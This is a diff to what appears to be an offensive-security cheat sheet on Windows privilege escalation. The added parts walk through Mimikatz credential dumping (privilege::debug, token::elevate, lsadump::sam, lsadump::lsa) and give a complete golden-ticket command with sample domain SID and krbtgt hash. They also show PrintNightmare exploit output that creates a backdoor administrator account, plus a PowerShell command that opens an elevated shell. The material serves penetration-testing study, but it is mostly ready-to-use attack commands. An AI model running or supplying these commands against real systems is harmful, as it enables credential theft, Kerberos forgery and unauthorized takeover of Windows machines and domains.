@@ -293,6 +293,43 @@ Performs many functions. Notably, pass-the-hash attacks, extracting plaintext pa
 ```
 https://github.com/ParrotSec/mimikatz
 ```
+```
+https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz
+```
+
+example: dump hashes
+```
+privilege::debug
+```
+-- this obtains debug privileges which (without going into too much depth in the Windows privilege structure) allows us to access other processes for "debugging" purposes.
+```
+token::elevate
+```
+-- simply put, this takes us from our administrative shell with high privileges into a SYSTEM level shell with maximum privileges. This is something that we have a right to do as an administrator, but that is not usually possible using normal Windows operations.
+
+There are a variety of commands we could use here, all of which do slightly different things. The command that we will use is: lsadump::sam.
+When executed, this will provide us with a list of password hashes for every account on the machine (with some extra information thrown in as well). The Administrator account password hash should be fairly near the top of the list.
+
+execute: 
+```
+lsadump::sam
+```
+
+lsadump::sam dumps the local Security Account Manager (SAM) NT hashes (cf. SAM secrets dump). It can operate directly on the target system, or offline with registry hives backups (for SAM and SYSTEM ). It has the following command line arguments: /sam : the offline backup of the SAM hive.
+
+
+example 2:
+
+lsadump::lsa
+```
+This is used to dump all local credentials on a Windows computer. LSADUMP::Trust – Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly).
+
+
+golden ticket example:
+```
+.\mimikatz.exe "kerberos::golden /User:Administrator /domain:rd.lab.adsecurity.org /id:512 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt" exit
+```
+
 
 ### kekeo
 similar to mimikatz
@@ -1483,16 +1520,25 @@ https://github.com/micahvandeusen/GenericPotato
   ```
   
   and you will get a output like: 
-  ```
+```
   [+] using default new user: adm1n
 [+] using default new password: P@ssw0rd
 [+] created payload at C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll
 [+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_18b0d38ddfaee729\Amd64\mxdwdrv.dll"
 [+] added user  as local administrator
 [+] deleting payload from C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll
-  ```
+```
 
   
 Notice that our payload mentions creating a new user called adm1n with a password of P@ssw0rd? This is the default behaviour when using this exploit; however, we could have created our own payload and substituted that in should we have preferred another method of exploitation.
   
 We could also take the simple option of right-clicking (if we are in a RDP GUI) on PowerShell or cmd.exe and choosing to "Run as Administrator"
+  
+We could also use a hacky little PowerShell command to start a new high-integrity command prompt running as our new administrator.
+```
+Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n
+```
+  
+Run the command "whoami /groups" in the new window. You should see "BUILTIN\Administrators" in the list of groups, and a line at the bottom of the output containing "Mandatory Label\High Mandatory Level".
+  
+
